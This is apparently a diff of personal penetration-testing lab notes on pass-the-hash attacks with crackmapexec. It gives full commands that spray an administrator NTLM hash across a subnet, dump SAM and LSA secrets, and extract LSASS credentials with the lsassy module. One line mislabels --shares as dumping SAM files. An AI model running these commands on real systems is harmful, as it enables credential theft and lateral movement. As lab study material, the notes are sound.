@@ -3,6 +3,8 @@ Setup Peterparker: \192.168.64.140
 Setup Frankcastle: 192.168.64.139  
 Kali: \192.168.64.129/24  
 
+---
+
 ## 🚩 'Pass Attacks' - Pass the Password / Pass the Hash.  
 
 ### Pass the Password  
@@ -27,9 +29,28 @@ crackmapexec SMB Hash abuse:
 ![image](https://github.com/user-attachments/assets/13e70253-c999-4110-baf0-1cab4d1841f4)  
 Local admin account succesful for Spiderman and Thepunisher  
 
-adding the below flags behind --local-auth:   
+### Note 1 Information gathering  
+**Adding the below flags behind --local-auth:**  
 --sam {dumps all local SAM files found}  
---shares {dumps all local SAM files found}  
---lsa {local security authority}  
+--shares (dumps all local SAM files found)  
+--lsa (local security authority)  
 
-crackmapexec smb -L will list out all the modules we can use with SMB
+    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth --sam
+
+### Note 2 (SMB) Modules  
+**crackmapexec smb -L will list out all the modules we can use with SMB by adding -M behind --local-auth:**  
+-L  
+-M Lsassy  
+
+    crackmapexec smb -L
+    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth -M lsassy  
+
+### Note 3 crackmapexec database
+
+    root@kali:/home/kali# cmedb
+    cmedb (default)(smb) > help
+![image](https://github.com/user-attachments/assets/d758e9f9-056b-40b3-ac2e-262eac9cd2b6)
+
+
+
+
